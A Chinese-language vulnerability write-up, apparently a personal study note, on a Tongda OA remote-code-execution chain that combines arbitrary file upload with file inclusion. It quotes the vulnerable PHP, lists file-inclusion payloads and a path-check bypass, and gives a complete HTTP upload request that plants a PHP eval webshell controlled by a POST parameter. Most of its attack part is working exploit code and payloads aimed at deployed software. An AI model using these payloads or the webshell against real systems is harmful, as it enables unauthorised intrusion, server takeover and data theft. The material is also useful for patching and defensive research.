通达OA RCE
========

0x01 获取信息
---------

```php
获取版本信息
inc/expired.php
inc/reg_trial.php
inc/reg_trial_submit.php

获取计算机名
resque/worker.php
```

0x02 影响版本
---------

V11版  
2017版  
2016版  
2015版  
2013增强版  
2013版

0x03 漏洞简介
---------

任意文件上传+文件包含最后getshell

不同版本文件包含的地址不一样

```php
2013
/ispirit/im/upload.php
/ispirit/interface/gateway.php

2017
/ispirit/im/upload.php
/mac/gateway.php
```

2015说是没有文件包含，到时候本地搭一下看看

0X04 文件包含
---------

上面说过了2017的文件包含位置

```php
http://127.0.0.1/mac/gateway.php
post:json={&quot;url&quot;: &quot;../../nginx/logs/oa.access.log&quot;}

```

但是看了一下代码并不知道为什么可以包含文件，因为没有$\_POST的地方

后来一直翻包含文件才发现原来是inc/common.inc.php

```php
if (0 &lt; count($_COOKIE)) {
    foreach ($_COOKIE as $s_key =&gt; $s_value ) {
        if (!is_array($s_value)) {
            $_COOKIE[$s_key] = addslashes(strip_tags($s_value));
        }

        $s_key = $_COOKIE[$s_key];
    }

    reset($_COOKIE);
}

if (0 &lt; count($_POST)) {
    $arr_html_fields = array();

    foreach ($_POST as $s_key =&gt; $s_value ) {
        if (substr($s_key, 0, 15) != &quot;TD_HTML_EDITOR_&quot;) {
            if (!is_array($s_value)) {
                $_POST[$s_key] = addslashes(strip_tags($s_value));
            }

            $s_key = $_POST[$s_key];
        }
        else {
            if (($s_key == &quot;TD_HTML_EDITOR_FORM_HTML_DATA&quot;) || ($s_key == &quot;TD_HTML_EDITOR_PRCS_IN&quot;) || ($s_key == &quot;TD_HTML_EDITOR_PRCS_OUT&quot;) || ($s_key == &quot;TD_HTML_EDITOR_QTPL_PRCS_SET&quot;) || (isset($_POST[&quot;ACTION_TYPE&quot;]) &amp;&amp; (($_POST[&quot;ACTION_TYPE&quot;] == &quot;approve_center&quot;) || ($_POST[&quot;ACTION_TYPE&quot;] == &quot;workflow&quot;) || ($_POST[&quot;ACTION_TYPE&quot;] == &quot;sms&quot;) || ($_POST[&quot;ACTION_TYPE&quot;] == &quot;wiki&quot;)) &amp;&amp; (($s_key == &quot;CONTENT&quot;) || ($s_key == &quot;TD_HTML_EDITOR_CONTENT&quot;) || ($s_key == &quot;TD_HTML_EDITOR_TPT_CONTENT&quot;)))) {
                unset($_POST[$s_key]);
                $s_key = ($s_key == &quot;CONTENT&quot; ? $s_key : substr($s_key, 15));
                $s_key = addslashes($s_value);
                $arr_html_fields[$s_key] = $s_key;
            }
            else {
                $encoding = mb_detect_encoding($s_value, &quot;GBK,UTF-8&quot;);
                unset($_POST[$s_key]);
                $s_key = substr($s_key, 15);
                $s_key = addslashes(rich_text_clean($s_value, $encoding));
                $arr_html_fields[$s_key] = $s_key;
            }
        }
    }

    reset($_POST);
    $_POST = array_merge($_POST, $arr_html_fields);
}

if (0 &lt; count($_GET)) {
    foreach ($_GET as $s_key =&gt; $s_value ) {
        if (!is_array($s_value)) {
            $_GET[$s_key] = addslashes(strip_tags($s_value));
        }

        $s_key = $_GET[$s_key];
    }

    reset($_GET);
}

unset($s_key);
unset($s_value);
```

有这么一段代码，就是所有GET,POST,COOKIE都会经过过滤，同时所有变量都可以直接传参，有点变量覆盖的感觉了

那其实文件包含在GET,POST,COOKIE里面都可以，尝试了之后发现是可行的

下面是gateway.php

```php
&lt;?php

ob_start();
include_once &quot;inc/session.php&quot;;
include_once &quot;inc/conn.php&quot;;
include_once &quot;inc/utility_org.php&quot;;

if ($P != &quot;&quot;) {
    if (preg_match(&quot;/[^a-z0-9;]+/i&quot;, $P)) {
        echo _(&quot;非法参数&quot;);
        exit();
    }

    session_id($P);
    session_start();
    session_write_close();
    if (($_SESSION[&quot;LOGIN_USER_ID&quot;] == &quot;&quot;) || ($_SESSION[&quot;LOGIN_UID&quot;] == &quot;&quot;)) {
        echo _(&quot;RELOGIN&quot;);
        exit();
    }
}

if ($json) {
    $json = stripcslashes($json);
    $json = (array) json_decode($json);

    foreach ($json as $key =&gt; $val ) {
        if ($key == &quot;data&quot;) {
            $val = (array) $val;

            foreach ($val as $keys =&gt; $value ) {
                $keys = $value;
            }
        }

        if ($key == &quot;url&quot;) {
            $url = $val;
        }
    }

    if ($url != &quot;&quot;) {
        if (substr($url, 0, 1) == &quot;/&quot;) {
            $url = substr($url, 1);
        }

        include_once $url;
    }

    exit();
}

?&gt;

```

有些版本在包含$url的时候也会有判断，比如一定要包含general,ispirit,module其中一个，

可以通过../general/../../nginx/logs/oa.access.log绕过

如果不传P就可绕过第一个判断，第二个判断需要先传入一个json，可以把url放到json里面，也可以把url参数单独传，只要url不为空就会进入第一个包含

总结一下常规的payload

```php
json={&quot;url&quot;: &quot;../../nginx/logs/oa.access.log&quot;}
json{}=&amp;url=../../nginx/logs/oa.access.log
json{}=&amp;url=../general/../../nginx/logs/oa.access.log
```

0x05 文件上传
---------

<http://127.0.0.1/ispirit/im/upload.php>

![](../../../images/web/vulnerability/tongoa_rce_2017/picture1.png)

首先传入P绕过第一个判断

不一定要获取session，主要是要绕过这个判断不走到auth.php里面

DEST\_UID的两个判断不是关键，只要$UPLOAD\_MODE为2都是可以走出去，不像有些文章说的一定不能等于0

![](../../../images/web/vulnerability/tongoa_rce_2017/picture2.png)

但是upload里面进去找了半天还是不知道为什么就上传成功了

upload-&gt;add\_attach-&gt;$ATTACH\_ENCRYPT\["ENABLE"\] == 1

主要就是走这么一条路，ENABLE=1就上传成功了，但是不知道上传文件的代码在哪，也不知道ENABLE怎么变成1的，果然还是太弟弟了下，希望有大佬看到了带带我

这边就不继续看下去了，upload主要就是过滤后缀，不过因为有文件包含，后缀白名单里面选一个就行

现在看下来需要这几个参数

```php
UPLOAD_MODE
P
DEST_UID    (可为空，但UPLOAD_MODE必须为2)
ATTACHMENT
```

就可以构造exp了

```php
POST /ispirit/im/upload.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 626
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Content-Type: multipart/form-data; boundary=---123
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Cookie: PHPSESSID=123
Connection: close

---123
Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;

2
---123
Content-Disposition: form-data; name=&quot;P&quot;

123
---123
Content-Disposition: form-data; name=&quot;DEST_UID&quot;

1
---123
Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;
Content-Type: image/jpeg

&lt;?php eval($_POST['pass']); ?&gt;
---123
```

这里Content-Type后面的boundary要和下面都一样，这也是刚刚学到的

还有一句话可以正常写，因为蚁剑自带COM执行命令

之后看看能不能写个工具自动化吧